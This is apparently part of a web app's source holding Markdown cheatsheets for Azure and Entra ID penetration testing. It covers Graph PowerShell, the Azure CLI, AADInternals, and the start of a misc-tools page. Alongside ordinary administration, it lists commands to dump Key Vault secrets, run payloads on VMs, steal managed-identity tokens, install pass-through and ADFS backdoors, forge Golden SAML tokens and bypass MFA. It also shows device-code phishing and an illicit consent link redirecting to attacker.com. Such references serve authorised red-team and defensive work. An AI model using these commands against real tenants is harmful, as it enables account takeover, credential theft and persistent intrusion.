+Get-MgUser -All -Property DisplayName,UserPrincipalName,Id,AccountEnabled,UserType,CreatedDateTime,LastPasswordChangeDateTime,OnPremisesSyncEnabled |
+    Select DisplayName,UserPrincipalName,Id,AccountEnabled,UserType,CreatedDateTime,LastPasswordChangeDateTime,OnPremisesSyncEnabled |
+    Export-Csv users.csv -NoTypeInformation
+
+# All role assignments
+Get-MgRoleManagementDirectoryRoleAssignment -All -ExpandProperty "principal,roleDefinition" |
+    Select @{N="User";E={$_.Principal.AdditionalProperties.userPrincipalName}},
+           @{N="Role";E={$_.RoleDefinition.DisplayName}} | Export-Csv role_assignments.csv -NoTypeInformation
+
+# All service principals with secrets
+Get-MgApplication -All |
+    Where-Object { $_.PasswordCredentials.Count -gt 0 } |
+    Select DisplayName, AppId, @{N="SecretCount";E={$_.PasswordCredentials.Count}} |
+    Export-Csv apps_with_secrets.csv -NoTypeInformation
+\`\`\`
+
+---
+
+## OData Query Tips
+
+\`\`\`powershell
+# Operators: eq, ne, gt, lt, ge, le, startsWith, endsWith, contains, any, all
+# ConsistencyLevel eventual required for $search and $count
+
+Get-MgUser -Search '"displayName:admin"' -ConsistencyLevel eventual -CountVariable count
+
+# Combining filter and select
+Get-MgUser -Filter "accountEnabled eq true and userType eq 'Member'" \`
+           -Select "displayName,userPrincipalName,id,lastPasswordChangeDateTime" -All
+
+# Expand related entity
+Get-MgUser -UserId "user@domain.com" -ExpandProperty "manager"
+\`\`\``;
+
+CONTENT.azcli = `# Azure CLI (az) Cheatsheet
+
+---
+
+## Installation & Setup
+
+\`\`\`bash
+# Install on Arch
+yay -S azure-cli
+
+# Install via script (Debian/Ubuntu)
+curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+
+# Upgrade
+az upgrade
+
+# Version
+az version
+
+# Useful extensions
+az extension add --name resource-graph
+az extension add --name azure-devops
+az extension add --name account
+\`\`\`
+
+---
+
+## Authentication
+
+\`\`\`bash
+# Interactive login
+az login
+
+# Device code (headless)
+az login --use-device-code
+
+# Specific tenant
+az login --tenant "TENANT-ID"
+az login --tenant "domain.onmicrosoft.com"
+
+# Service principal (password)
+az login --service-principal -u "APP-ID" -p "SECRET" --tenant "TENANT-ID"
+
+# Service principal (certificate)
+az login --service-principal -u "APP-ID" --certificate /path/to/cert.pem --tenant "TENANT-ID"
+
+# Managed Identity (from within Azure resource)
+az login --identity
+az login --identity --username "CLIENT-ID"   # user-assigned MI
+
+# Show current account
+az account show
+
+# List all accessible subscriptions
+az account list --output table
+
+# Switch subscription
+az account set --subscription "SUBSCRIPTION-ID-OR-NAME"
+
+# Get access token (for manual API calls)
+az account get-access-token
+az account get-access-token --resource "https://graph.microsoft.com"
+az account get-access-token --resource "https://management.azure.com"
+az account get-access-token --resource "https://vault.azure.net"
+az account get-access-token --query accessToken --output tsv
+
+# Logout
+az logout
+\`\`\`
+
+---
+
+## Account & Subscription
+
+\`\`\`bash
+# List subscriptions
+az account list --all --output table
+az account list --query "[].{Name:name, ID:id, State:state, TenantID:tenantId}" --output table
+
+# Subscription details
+az account show --subscription "SUBSCRIPTION-ID"
+
+# Tenant list
+az account tenant list
+
+# List resource groups
+az group list --output table
+
+# List resources in subscription
+az resource list --output table
+az resource list --resource-group "RG-NAME" --output table
+az resource list --resource-type "Microsoft.Compute/virtualMachines" --output table
+\`\`\`
+
+---
+
+## Entra ID — Users
+
+\`\`\`bash
+# List all users
+az ad user list --output table
+az ad user list --query "[].{Name:displayName, UPN:userPrincipalName, ID:id, Enabled:accountEnabled}"
+
+# Specific user
+az ad user show --id "user@domain.com"
+az ad user show --id "OBJECT-ID"
+
+# Search by display name
+az ad user list --filter "startswith(displayName,'admin')"
+az ad user list --display-name "John"
+
+# Guest users
+az ad user list --filter "userType eq 'Guest'"
+
+# Create user
+az ad user create \\
+  --display-name "Test User" \\
+  --user-principal-name "testuser@domain.com" \\
+  --password "P@ssw0rd123!" \\
+  --force-change-password-next-sign-in false
+
+# Update user / reset password
+az ad user update --id "user@domain.com" --password "NewP@ss123!" --force-change-password-next-sign-in false
+
+# Disable account
+az ad user update --id "user@domain.com" --account-enabled false
+
+# Delete user
+az ad user delete --id "user@domain.com"
+
+# Get user's group memberships
+az ad user get-member-groups --id "user@domain.com"
+\`\`\`
+
+---
+
+## Entra ID — Groups
+
+\`\`\`bash
+# List all groups
+az ad group list --output table
+
+# Specific group
+az ad group show --group "GROUP-NAME-OR-ID"
+
+# Group members
+az ad group member list --group "GROUP-NAME-OR-ID" --output table
+
+# Check if user is member
+az ad group member check --group "GROUP-NAME-OR-ID" --member-id "USER-OBJECT-ID"
+
+# Add/remove member
+az ad group member add --group "GROUP-NAME-OR-ID" --member-id "USER-OBJECT-ID"
+az ad group member remove --group "GROUP-NAME-OR-ID" --member-id "USER-OBJECT-ID"
+
+# Group owners
+az ad group owner list --group "GROUP-NAME-OR-ID"
+az ad group owner add --group "GROUP-NAME-OR-ID" --owner-object-id "USER-OBJECT-ID"
+
+# Create/delete group
+az ad group create --display-name "NewGroup" --mail-nickname "NewGroup"
+az ad group delete --group "GROUP-ID"
+\`\`\`
+
+---
+
+## Entra ID — Applications & Service Principals
+
+\`\`\`bash
+# List app registrations
+az ad app list --query "[].{Name:displayName, AppID:appId, ObjectID:id}" --output table
+
+# Specific app
+az ad app show --id "APP-ID-OR-OBJECT-ID"
+
+# List service principals
+az ad sp list --all --query "[].{Name:displayName, AppID:appId, Type:servicePrincipalType}" --output table
+
+# SP for a specific app
+az ad sp show --id "APP-ID"
+
+# ManagedIdentity SPs
+az ad sp list --filter "servicePrincipalType eq 'ManagedIdentity'" --output table
+
+# Create app + SP
+az ad app create --display-name "LegitApp"
+az ad sp create --id "APP-ID"
+
+# Create app + SP + RBAC in one go
+az ad sp create-for-rbac --name "MyApp" --role Contributor --scopes /subscriptions/SUB-ID
+
+# Add secret to app
+az ad app credential reset --id "APP-OBJECT-ID" --append
+az ad sp credential reset --id "SP-OBJECT-ID" --append
+
+# Show credential metadata
+az ad app credential list --id "APP-OBJECT-ID"
+az ad sp credential list --id "SP-OBJECT-ID"
+
+# Delete credential
+az ad app credential delete --id "APP-OBJECT-ID" --key-id "KEY-ID"
+
+# App owners
+az ad app owner list --id "APP-OBJECT-ID"
+az ad app owner add --id "APP-OBJECT-ID" --owner-object-id "USER-OBJECT-ID"
+
+# API permissions
+az ad app permission list --id "APP-OBJECT-ID"
+az ad app permission list-grants --id "APP-OBJECT-ID"
+az ad app permission add --id "APP-OBJECT-ID" \\
+  --api "00000003-0000-0000-c000-000000000000" \\
+  --api-permissions "e1fe6dd8-ba31-4d61-89e7-88639da4683d=Scope"  # User.Read
+az ad app permission admin-consent --id "APP-OBJECT-ID"
+
+# Delete app / SP
+az ad app delete --id "APP-OBJECT-ID"
+az ad sp delete --id "SP-OBJECT-ID"
+\`\`\`
+
+---
+
+## Entra ID — Roles
+
+\`\`\`bash
+# List role definitions
+az role definition list --query "[].{Name:roleName, ID:name}" --output table
+
+# List role assignments (all in subscription)
+az role assignment list --all --query "[].{Principal:principalName, Role:roleDefinitionName, Scope:scope}" --output table
+
+# Role assignments for specific user
+az role assignment list --assignee "user@domain.com" --all
+
+# Owner assignments
+az role assignment list --all --role Owner --output table
+
+# Assign role
+az role assignment create --assignee "user@domain.com" \\
+  --role "Contributor" --scope "/subscriptions/SUB-ID"
+
+# Assign at resource group scope
+az role assignment create --assignee "user@domain.com" \\
+  --role "Reader" --resource-group "RG-NAME"
+
+# Remove role assignment
+az role assignment delete --assignee "user@domain.com" --role "Contributor" \\
+  --scope "/subscriptions/SUB-ID"
+
+# Check current user's permissions
+az role assignment list --assignee $(az account show --query user.name -o tsv) --all
+\`\`\`
+
+---
+
+## Virtual Machines
+
+\`\`\`bash
+# List all VMs
+az vm list --query "[].{Name:name, RG:resourceGroup, OS:storageProfile.osDisk.osType}" --output table
+
+# VM status
+az vm list --show-details --output table
+az vm get-instance-view --name "VM-NAME" --resource-group "RG-NAME" \\
+  --query "instanceView.statuses[1].displayStatus"
+
+# Start/stop/restart/deallocate
+az vm start --name "VM-NAME" --resource-group "RG-NAME"
+az vm stop --name "VM-NAME" --resource-group "RG-NAME"
+az vm restart --name "VM-NAME" --resource-group "RG-NAME"
+az vm deallocate --name "VM-NAME" --resource-group "RG-NAME"
+
+# Run command on VM (RCE!)
+az vm run-command invoke --name "VM-NAME" --resource-group "RG-NAME" \\
+  --command-id RunPowerShellScript \\
+  --scripts "whoami; hostname; ipconfig"
+
+az vm run-command invoke --name "VM-NAME" --resource-group "RG-NAME" \\
+  --command-id RunShellScript \\
+  --scripts "id; hostname; cat /etc/passwd"
+
+# List run-command IDs
+az vm run-command list --location "eastus"
+
+# VM public IP
+az vm list-ip-addresses --name "VM-NAME" --resource-group "RG-NAME"
+
+# All VM public IPs across subscription
+az vm list-ip-addresses --all \\
+  --query "[].{Name:virtualMachine.name, IP:virtualMachine.network.publicIpAddresses[0].ipAddress}" --output table
+
+# Open port on NSG
+az vm open-port --name "VM-NAME" --resource-group "RG-NAME" --port 3389
+
+# Managed Identity for VM
+az vm identity assign --name "VM-NAME" --resource-group "RG-NAME"
+
+# VM extensions
+az vm extension list --vm-name "VM-NAME" --resource-group "RG-NAME"
+
+# Custom Script Extension (code execution via ARM)
+az vm extension set --name CustomScriptExtension \\
+  --publisher Microsoft.Compute \\
+  --vm-name "VM-NAME" --resource-group "RG-NAME" \\
+  --settings '{"commandToExecute":"powershell -enc BASE64PAYLOAD"}'
+\`\`\`
+
+---
+
+## Key Vault
+
+\`\`\`bash
+# List all key vaults
+az keyvault list --query "[].{Name:name, RG:resourceGroup}" --output table
+
+# Access policies
+az keyvault show --name "VAULT-NAME" --query "properties.accessPolicies"
+
+# List secrets (names only)
+az keyvault secret list --vault-name "VAULT-NAME" --output table
+
+# Get secret VALUE
+az keyvault secret show --name "SECRET-NAME" --vault-name "VAULT-NAME" --query "value" --output tsv
+
+# Dump ALL secrets from a vault
+for secret in $(az keyvault secret list --vault-name "VAULT-NAME" --query "[].name" --output tsv); do
+    echo -n "$secret: "
+    az keyvault secret show --name "$secret" --vault-name "VAULT-NAME" --query "value" --output tsv
+done
+
+# Set/delete secret
+az keyvault secret set --vault-name "VAULT-NAME" --name "SECRET-NAME" --value "SECRET-VALUE"
+az keyvault secret delete --vault-name "VAULT-NAME" --name "SECRET-NAME"
+
+# List keys / certificates
+az keyvault key list --vault-name "VAULT-NAME" --output table
+az keyvault certificate list --vault-name "VAULT-NAME" --output table
+
+# Download certificate
+az keyvault certificate download --vault-name "VAULT-NAME" --name "CERT-NAME" --file cert.pem
+
+# Add access policy
+az keyvault set-policy --name "VAULT-NAME" \\
+  --object-id "YOUR-OBJECT-ID" \\
+  --secret-permissions get list set delete backup restore recover purge
+
+# RBAC Key Vault (newer model)
+az role assignment create --assignee "user@domain.com" \\
+  --role "Key Vault Secrets Officer" \\
+  --scope "/subscriptions/SUB-ID/resourceGroups/RG/providers/Microsoft.KeyVault/vaults/VAULT-NAME"
+\`\`\`
+
+---
+
+## Storage Accounts
+
+\`\`\`bash
+# List storage accounts
+az storage account list --query "[].{Name:name, RG:resourceGroup, PublicBlob:allowBlobPublicAccess}" --output table
+
+# Get storage account keys
+az storage account keys list --account-name "SA-NAME" --resource-group "RG-NAME"
+
+# Get connection string
+az storage account show-connection-string --name "SA-NAME" --resource-group "RG-NAME"
+
+# List containers
+az storage container list --account-name "SA-NAME" --account-key "KEY" --output table
+
+# List blobs in container
+az storage blob list --account-name "SA-NAME" --container-name "CONTAINER" \\
+  --account-key "KEY" --output table
+
+# Download blob
+az storage blob download --account-name "SA-NAME" --container-name "CONTAINER" \\
+  --name "blob.txt" --file "./blob.txt" --account-key "KEY"
+
+# Download ALL blobs in container
+az storage blob download-batch --account-name "SA-NAME" \\
+  --source "CONTAINER" --destination "./output/" --account-key "KEY"
+
+# Upload file
+az storage blob upload --account-name "SA-NAME" --container-name "CONTAINER" \\
+  --name "file.txt" --file "./file.txt" --account-key "KEY"
+
+# Generate SAS token
+az storage account generate-sas --account-name "SA-NAME" --account-key "KEY" \\
+  --permissions acdlrw --resource-types sco --services bfqt \\
+  --expiry "2025-12-31" --output tsv
+\`\`\`
+
+### Storage Blob Data Reader (--auth-mode login)
+
+\`\`\`bash
+# List containers (Entra ID auth — no key needed)
+az storage container list --account-name "SA-NAME" --auth-mode login --output table
+
+# List blobs in container
+az storage blob list --account-name "SA-NAME" --container-name "CONTAINER" --auth-mode login --output table
+
+# Download a blob
+az storage blob download --account-name "SA-NAME" --container-name "CONTAINER" \\
+  --name "FILENAME" --file "LOCALPATH" --auth-mode login
+\`\`\`
+
+---
+
+## Networking
+
+\`\`\`bash
+# List virtual networks
+az network vnet list --output table
+
+# List NSGs
+az network nsg list --output table
+
+# NSG rules
+az network nsg rule list --nsg-name "NSG-NAME" --resource-group "RG-NAME" --output table
+
+# Public IPs
+az network public-ip list --query "[?ipAddress!=null].{Name:name, IP:ipAddress}" --output table
+
+# Network interfaces
+az network nic list --output table
+
+# List all load balancers
+az network lb list --output table
+
+# VNet peering
+az network vnet peering list --vnet-name "VNET-NAME" --resource-group "RG-NAME" --output table
+
+# Private Endpoints
+az network private-endpoint list --output table
+\`\`\`
+
+---
+
+## Managed Identities
+
+\`\`\`bash
+# List user-assigned managed identities
+az identity list --query "[].{Name:name, ClientID:clientId, PrincipalID:principalId}" --output table
+
+# Create user-assigned MI
+az identity create --name "MI-NAME" --resource-group "RG-NAME"
+
+# Assign MI to VM
+az vm identity assign --name "VM-NAME" --resource-group "RG-NAME" --identities "MI-RESOURCE-ID"
+
+# From within Azure resource — get token via IMDS
+curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Get VM metadata
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# Token for Graph API
+curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
+
+# Token for Key Vault
+curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"
+
+# Extract and use token
+TOKEN=$(curl -s -H "Metadata: true" \\
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+curl -s -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
+\`\`\`
+
+---
+
+## Azure Functions & App Services
+
+\`\`\`bash
+# List function apps
+az functionapp list --output table
+
+# Function app settings (env vars — may contain secrets!)
+az functionapp config appsettings list --name "FUNC-NAME" --resource-group "RG-NAME"
+
+# List web apps
+az webapp list --output table
+
+# App service settings
+az webapp config appsettings list --name "APP-NAME" --resource-group "RG-NAME"
+
+# Connection strings (often DB creds)
+az webapp config connection-string list --name "APP-NAME" --resource-group "RG-NAME"
+
+# Get publish credentials
+az webapp deployment list-publishing-credentials --name "APP-NAME" --resource-group "RG-NAME"
+
+# SSH into Linux app service
+az webapp ssh --name "APP-NAME" --resource-group "RG-NAME"
+
+# App service identity
+az webapp identity show --name "APP-NAME" --resource-group "RG-NAME"
+az webapp identity assign --name "APP-NAME" --resource-group "RG-NAME"
+\`\`\`
+
+---
+
+## Container / AKS
+
+\`\`\`bash
+# List AKS clusters
+az aks list --output table
+
+# Get kubeconfig credentials
+az aks get-credentials --name "CLUSTER-NAME" --resource-group "RG-NAME"
+az aks get-credentials --name "CLUSTER-NAME" --resource-group "RG-NAME" --admin
+
+# Container registries (ACR)
+az acr list --output table
+az acr credential show --name "REGISTRY-NAME"   # admin creds if enabled
+
+# List images in registry
+az acr repository list --name "REGISTRY-NAME" --output table
+az acr repository show-tags --name "REGISTRY-NAME" --repository "REPO-NAME" --output table
+
+# Pull image
+az acr login --name "REGISTRY-NAME"
+docker pull "REGISTRY-NAME.azurecr.io/REPO:TAG"
+
+# Container instances
+az container list --output table
+az container logs --name "CONTAINER-NAME" --resource-group "RG-NAME"
+az container exec --name "CONTAINER-NAME" --resource-group "RG-NAME" --exec-command "/bin/bash"
+\`\`\`
+
+---
+
+## Resource Graph Queries
+
+\`\`\`bash
+# Install extension
+az extension add --name resource-graph
+
+# All VMs
+az graph query -q "Resources | where type == 'microsoft.compute/virtualmachines' | project name, resourceGroup, location"
+
+# Storage accounts with public blob access
+az graph query -q "Resources | where type == 'microsoft.storage/storageaccounts' | where properties.allowBlobPublicAccess == true"
+
+# Key vaults with soft delete disabled
+az graph query -q "Resources | where type == 'microsoft.keyvault/vaults' | where properties.enableSoftDelete == false"
+
+# Resources with managed identity
+az graph query -q "Resources | where isnotnull(identity) | project name, type, identity.type, identity.principalId"
+
+# All role assignments
+az graph query -q "authorizationresources | where type == 'microsoft.authorization/roleassignments'"
+\`\`\`
+
+---
+
+## Output Formatting & JMESPath
+
+\`\`\`bash
+# Output formats
+az ... --output table       # Human-readable table
+az ... --output json        # Full JSON
+az ... --output tsv         # Tab-separated (good for scripting)
+az ... --output jsonc       # JSON with color
+
+# JMESPath queries
+az ... --query "value[0].displayName"
+az ... --query "[].{Name:name, ID:id}"
+az ... --query "[?accountEnabled==\`true\`].userPrincipalName"
+az ... --query "length(@)"
+
+# Debug
+az ... --debug
+az ... --verbose
+
+# Set defaults
+az configure --defaults group="RG-NAME" location="eastus"
+az config set core.output=table
+\`\`\`
+
+---
+
+## REST API via az rest
+
+\`\`\`bash
+# Generic GET to management API
+az rest --method GET --url "https://management.azure.com/subscriptions?api-version=2020-01-01"
+
+# Graph API call
+az rest --method GET --url "https://graph.microsoft.com/v1.0/users" \\
+  --headers "Content-Type=application/json"
+
+# POST to Graph
+az rest --method POST \\
+  --url "https://graph.microsoft.com/v1.0/groups" \\
+  --body '{"displayName":"NewGroup","mailEnabled":false,"securityEnabled":true,"mailNickname":"newgroup"}' \\
+  --headers "Content-Type=application/json"
+
+# Custom RBAC role definitions
+az rest --method GET \\
+  --url "https://management.azure.com/subscriptions/SUB-ID/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01&\\$filter=type eq 'CustomRole'"
+
+# Get objects owned by a user (apps, groups, etc.)
+az rest --method GET --url "https://graph.microsoft.com/v1.0/users/USER-OBJECT-ID/ownedObjects"
+
+# List Entra ID role assignments by principal ID (user or group)
+az rest --method GET --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\\$filter=principalId eq 'PRINCIPAL-ID'"
+
+# List appRoleAssignments granted to a service principal
+az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP-OBJECT-ID/appRoleAssignments"
+
+# Resolve an object ID to its display name and type
+az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryObjects/OBJECT-ID"
+
+# Get service principal by app (client) ID
+az ad sp show --id "APP-CLIENT-ID"
+
+# Get service principal object ID from app ID (PowerShell)
+$spId = az ad sp show --id "APP-CLIENT-ID" --query id -o tsv
+
+# Get group/role memberships of a service principal
+az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP-OBJECT-ID/memberOf"
+
+# Show app role assignments for a service principal (using resolved $spId)
+az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/appRoleAssignments"
+
+# Resolve SP permissions to human-readable names (PowerShell + az rest)
+$spId = az ad sp show --id "APP-CLIENT-ID" --query id -o tsv
+az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/appRoleAssignments" \`
+  | ConvertFrom-Json | Select-Object -ExpandProperty value | ForEach-Object {
+    $roleId = $_.appRoleId
+    $roleName = az rest --method GET \`
+      --url "https://graph.microsoft.com/v1.0/servicePrincipals/$($_.resourceId)" \`
+      --query "appRoles[?id==\`'$roleId\`'].value" -o tsv
+    [PSCustomObject]@{ Permission = $roleName; Resource = $_.resourceDisplayName }
+}
+\`\`\``;
+
+CONTENT.aadinternals = `# AADInternals Cheatsheet
+
+---
+
+## Installation & Setup
+
+\`\`\`powershell
+# Install from PSGallery
+Install-Module AADInternals -Scope CurrentUser -Force
+
+# Import
+Import-Module AADInternals
+
+# Update
+Update-Module AADInternals
+
+# List all commands
+Get-Command -Module AADInternals | Sort-Object Name
+Get-Command -Module AADInternals | Measure-Object
+\`\`\`
+
+---
+
+## Recon — No Credentials Required
+
+\`\`\`powershell
+# Full tenant recon from domain name — NO AUTH needed
+Invoke-AADIntReconAsOutsider -DomainName "company.com" | Format-List
+
+# Returns: tenant name/ID, domains, auth methods, desktop SSO,
+#          seamless SSO, ADFS endpoint, tenant region, MDI presence
+
+# Just tenant info
+Get-AADIntTenantID -Domain "company.com"
+Get-AADIntTenantDetails -Domain "company.com"
+
+# All domains for a tenant
+Get-AADIntTenantDomains -Domain "company.com"
+
+# User existence check (no auth) — user enumeration
+Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@company.com"
+Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@company.com" -Method Normal
+# Methods: Normal, Login, Autologon
+
+# Bulk user enumeration from list
+Get-Content users.txt | ForEach-Object {
+    Invoke-AADIntUserEnumerationAsOutsider -UserName $_
+}
+
+# Check login type for domain (federated=ADFS, managed=cloud-only)
+Get-AADIntLoginInformation -Domain "company.com"
+
+# Get ADFS endpoint
+Get-AADIntLoginInformation -Domain "company.com" | Select MsosDomainAuthType, AuthURL
+\`\`\`
+
+---
+
+## Authentication & Token Acquisition
+
+\`\`\`powershell
+# Interactive (opens browser)
+Get-AADIntAccessTokenForMSGraph -SaveToCache
+Get-AADIntAccessTokenForAADGraph -SaveToCache
+Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
+Get-AADIntAccessTokenForTeams -SaveToCache
+Get-AADIntAccessTokenForOneDrive -SaveToCache
+Get-AADIntAccessTokenForExchangeOnline -SaveToCache
+Get-AADIntAccessTokenForSharePoint -SaveToCache
+
+# Device code flow
+Get-AADIntAccessTokenForMSGraph -UseDeviceCode -SaveToCache
+
+# Client credentials (app secret)
+Get-AADIntAccessTokenForMSGraph -ClientId "APP-ID" -ClientSecret "SECRET" -Tenant "TENANT-ID"
+
+# Using refresh token
+Get-AADIntAccessTokenForMSGraph -RefreshToken "REFRESH-TOKEN"
+
+# PRT-based auth
+Get-AADIntAccessTokenFromPRT -PRTToken "PRT-TOKEN"
+
+# Cloud AP PRT extraction (run as SYSTEM)
+$prt = Get-AADIntUserPRTToken
+$prt | Get-AADIntAccessTokenFromPRT -SaveToCache
+
+# Check cached tokens
+Get-AADIntCachedAccessTokens
+
+# Decode/inspect token
+Read-AADIntAccessToken -AccessToken "eyJ0eXAi..."
+\`\`\`
+
+---
+
+## Recon — As Insider (Authenticated)
+
+\`\`\`powershell
+# Full insider recon
+Invoke-AADIntReconAsInsider
+
+# All users
+Get-AADIntUsers | Select UserPrincipalName, ObjectId, ImmutableId, Enabled, OnPremisesSyncEnabled
+
+# All groups
+Get-AADIntGroups
+
+# All devices
+Get-AADIntDevices
+
+# All service principals
+Get-AADIntServicePrincipals
+
+# All applications
+Get-AADIntApplications
+
+# Conditional access policies
+Get-AADIntConditionalAccessPolicies
+
+# Directory sync status
+Get-AADIntSyncEnabled
+
+# Tenant sync configuration
+Get-AADIntSyncConfiguration
+
+# Auth methods policy
+Get-AADIntAuthenticationMethodsPolicy
+
+# Security defaults
+Get-AADIntSecurityDefaults
+
+# Password policy
+Get-AADIntPasswordPolicy
+\`\`\`
+
+---
+
+## Pass-Through Authentication (PTA) Attacks
+
+\`\`\`powershell
+# Install PTA backdoor — accepts ANY password for ANY user
+# Run on Azure AD Connect server or PTA agent as admin
+Install-AADIntPTASpy
+
+# After spy install, check accepted passwords
+Get-AADIntPTASpyLog
+
+# Verify PTA agent
+Get-AADIntPTAAgents
+
+# Check PTA connector groups
+Get-AADIntPTAAgentGroups
+
+# Remove PTA spy
+Uninstall-AADIntPTASpy
+\`\`\`
+
+---
+
+## ADFS Attacks
+
+\`\`\`powershell
+# Export ADFS configuration (run on ADFS server)
+Export-AADIntADFSConfiguration
+
+# Get ADFS signing certificate
+Export-AADIntADFSSigningCertificate
+Export-AADIntADFSEncryptionCertificate
+
+# ADFS token signing cert from local cert store
+Get-AADIntADFSSigningCertificate -Local
+
+# Generate ADFS token (Golden SAML)
+New-AADIntSAMLToken -UPN "admin@company.com" \\
+  -Issuer "http://adfs.company.com/adfs/services/trust" \\
+  -PfxFileName .\adfs_sign.pfx -PfxPassword "password"
+
+# Golden SAML → access token
+$saml = New-AADIntSAMLToken -UPN "admin@company.com" -Issuer "..." -PfxFileName .\adfs.pfx
+Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
+
+# Install ADFS backdoor (accepts any credential)
+Install-AADIntADFSBackdoor
+\`\`\`
+
+---
+
+## Azure AD Connect / Hybrid Identity
+
+\`\`\`powershell
+# Get Azure AD Connect configuration (run on AAD Connect server)
+Get-AADIntAADConnectConfig
+
+# Extract sync credentials (MSOL_* service account)
+Get-AADIntSyncCredentials
+
+# Get AD sync configuration
+Get-AADIntSyncObjects
+
+# Decrypt AAD Connect SQL credentials
+Get-AADIntAADConnectSyncCredentials
+
+# Set user password via sync (bypasses cloud password policy)
+Set-AADIntUserPassword -SourceAnchor "BASE64-IMMUTABLE-ID" -Password "NewP@ss123!"
+
+# Get ImmutableId from on-prem AD ObjectGUID
+$guid = [System.Guid]::Parse("AD-OBJECT-GUID")
+$immutableId = [System.Convert]::ToBase64String($guid.ToByteArray())
+\`\`\`
+
+---
+
+## Token & Session Manipulation
+
+\`\`\`powershell
+# Seamless SSO / Kerberos
+Get-AADIntAccessTokenForMSGraph -KerberosTicket
+
+# Extract tokens from browser cache
+Get-AADIntTokenFromBrowserCache -Browser Edge
+Get-AADIntTokenFromBrowserCache -Browser Chrome
+
+# PRT from LSASS (needs SYSTEM)
+Get-AADIntUserPRTToken
+
+# Create PRT nonce cookie for browser MFA bypass
+$prtToken = Get-AADIntUserPRTToken
+$cookie = Get-AADIntAccessTokenFromPRT -PRTToken $prtToken -GetNonce
+# Use $cookie in browser to skip MFA
+
+# Refresh token
+$newToken = Get-AADIntAccessTokenForMSGraph -RefreshToken "REFRESH_TOKEN_HERE"
+\`\`\`
+
+---
+
+## Persistence Backdoors
+
+\`\`\`powershell
+# Create new admin user
+New-AADIntAdminUser -Password "BackdoorP@ss!" -UserPrincipalName "backup@company.com"
+
+# Enable Seamless SSO
+Set-AADIntDesktopSSO -Enable $true
+
+# Enable alternate login ID
+Set-AADIntAlternateLoginID -Enable $true
+
+# Extend token lifetime
+Set-AADIntTokenLifetime
+
+# OAuth illicit consent grant URL
+$tenantId = "TENANT-ID"
+$clientId = "YOUR-APP-ID"
+$redirectUri = "https://attacker.com/callback"
+$consentUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/authorize?client_id=$clientId&response_type=code&redirect_uri=$redirectUri&scope=https://graph.microsoft.com/.default&prompt=admin_consent"
+Write-Host $consentUrl
+\`\`\`
+
+---
+
+## Device Code Phishing
+
+\`\`\`powershell
+# Send victim a device code — you receive their token when they auth
+Invoke-AADIntDeviceCodeFlow -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" \`
+  -Resource "https://graph.microsoft.com"
+
+# Office 365 resource
+Invoke-AADIntDeviceCodeFlow -Resource "https://outlook.office365.com"
+
+# Teams resource
+Invoke-AADIntDeviceCodeFlow -Resource "https://api.spaces.skype.com"
+\`\`\`
+
+---
+
+## Exchange Online & Teams
+
+\`\`\`powershell
+# Read mailbox
+Get-AADIntUserMailbox -UserPrincipalName "victim@company.com"
+
+# Send email as user
+Send-AADIntOutlookMessage -AccessToken $token \\
+  -RecipientAddress "target@external.com" \\
+  -Subject "Urgent" -Message "Please click this link..."
+
+# Read Teams messages
+Get-AADIntTeamsMessages -AccessToken $teamsToken
+
+# Send Teams message
+Send-AADIntTeamsMessage -AccessToken $teamsToken \\
+  -Recipients "user@company.com" -Message "Hello"
+
+# List Teams
+Get-AADIntTeams -AccessToken $teamsToken
+\`\`\`
+
+---
+
+## Intune / MDM
+
+\`\`\`powershell
+# Get Intune devices
+Get-AADIntIntuneDevices
+
+# MDM enrollment URL
+Get-AADIntMDMEnrollmentUrl
+
+# Script policies
+Get-AADIntIntuneScripts
+
+# Invoke script on device
+Invoke-AADIntMDMScript -DeviceId "DEVICE-ID" -Script "whoami"
+\`\`\`
+
+---
+
+## Utilities
+
+\`\`\`powershell
+# Convert Object GUID to ImmutableId
+ConvertTo-AADIntSourceAnchor -ObjectGuid "AD-OBJECT-GUID"
+
+# Convert ImmutableId to GUID
+ConvertFrom-AADIntSourceAnchor -ImmutableId "BASE64-STRING"
+
+# Get TenantID from domain
+Get-AADIntTenantID -Domain "company.com"
+
+# Get all Microsoft IP ranges
+Get-AADIntIPAddresses
+
+# Check if tenant has on-prem sync
+(Get-AADIntTenantDetails).OnPremisesSyncEnabled
+
+# Decode JWT token manually
+$token = "eyJ0eXAi..."
+$parts = $token.Split(".")
+$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1] + "=="))
+$payload | ConvertFrom-Json
+\`\`\``;
+
+CONTENT.misc = `# Azure Pentesting — Misc Tools
+## AzureHound · ROADtools · PowerZure · MicroBurst · GraphRunner · TokenTacticsV2
+
+---
+
+## AzureHound (BloodHound for Azure)
+
+### Installation
+\`\`\`bash
+wget https://github.com/BloodHoundAD/AzureHound/releases/latest/download/azurehound-linux-amd64.zip
+unzip azurehound-linux-amd64.zip
+
+# Or build from source
+git clone https://github.com/BloodHoundAD/AzureHound
+cd AzureHound && go build .
+\`\`\`
+
+### Collection
+\`\`\`bash
